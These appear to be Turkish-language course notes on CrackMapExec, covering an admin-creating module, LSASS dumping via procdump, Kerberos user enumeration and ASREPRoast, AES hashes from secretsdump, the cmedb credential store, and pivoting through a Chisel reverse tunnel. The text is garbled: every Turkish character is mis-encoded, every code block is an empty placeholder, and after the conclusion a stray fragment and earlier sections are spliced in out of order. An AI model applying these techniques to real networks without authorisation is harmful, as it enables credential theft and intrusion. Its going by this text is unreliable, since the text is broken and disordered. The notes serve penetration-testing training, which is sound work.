Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

